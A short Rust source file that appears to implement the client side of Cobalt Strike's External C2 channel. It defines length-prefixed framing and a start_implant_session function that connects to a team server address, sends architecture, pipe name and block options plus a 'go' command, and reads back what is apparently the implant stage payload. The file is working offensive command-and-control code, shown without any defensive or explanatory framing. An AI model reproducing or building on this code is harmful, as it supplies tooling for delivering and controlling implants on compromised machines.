use async_trait::async_trait;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
};

#[async_trait]
pub trait CSFrame {
    async fn write_frame(
        &mut self,
        data: &[u8],
    ) -> Result<(), Box<dyn std::error::Error>>;
    async fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
}

#[async_trait]
impl<T> CSFrame for T
where
    T: AsyncReadExt + AsyncWriteExt + std::marker::Unpin + std::marker::Send,
{
    async fn write_frame(
        &mut self,
        data: &[u8],
    ) -> Result<(), Box<dyn std::error::Error>> {
        let size: u32 = data.len().try_into()?;
        self.write_u32_le(size).await?;
        self.write_all(data).await?;
        return Ok(());
    }
    async fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let size = self.read_u32_le().await?.try_into()?;
        let mut buf: Vec<u8> = vec![0; size];
        self.read_exact(buf.as_mut_slice()).await?;
        return Ok(buf);
    }
}

pub async fn start_implant_session(
    ts_address: &str,
    arch: &str,
    pipename: &str,
) -> Result<(Vec<u8>, TcpStream), Box<dyn std::error::Error>> {
    let mut conn = TcpStream::connect(ts_address).await?;
    conn.write_frame(format!("arch={}", arch).as_bytes())
        .await?;
    conn.write_frame(format!("pipename={}", pipename).as_bytes())
        .await?;
    conn.write_frame("block=500".as_bytes()).await?;
    conn.write_frame("go".as_bytes()).await?;
    let res = conn.read_frame().await?;
    return Ok((res, conn));
}
